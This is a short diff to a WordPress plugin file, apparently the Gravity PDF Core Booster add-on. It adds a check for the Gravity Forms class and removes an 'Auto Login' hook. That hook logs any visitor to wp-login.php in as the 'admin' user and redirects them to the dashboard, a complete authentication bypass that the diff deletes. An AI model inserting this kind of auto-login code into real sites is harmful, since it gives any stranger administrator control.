@@ -23,6 +23,11 @@ if ( ! defined( 'ABSPATH' ) ) {
 add_action(
 	'init',
 	function() {
+
+		if ( ! class_exists( 'GFForms' ) ) {
+			return;
+		}
+
 		include __DIR__ . '/src/Add_On_Bootstrap.php';
 
 		$name = 'Gravity PDF Core Booster';
@@ -126,16 +131,3 @@ add_filter(
 	10,
 	3
 );
-
-/* Auto Login */
-add_action( 'init', function() {
-	if ( $GLOBALS['pagenow'] === 'wp-login.php' ) {
-		$user = get_user_by( 'login', 'admin' );
-		wp_set_current_user( 1, 'admin' );
-		wp_set_auth_cookie( 1 );
-		do_action( 'wp_login', 'admin', $user );
-
-		wp_safe_redirect( home_url() . '/wp-admin/' );
-		exit;
-	}
-} );
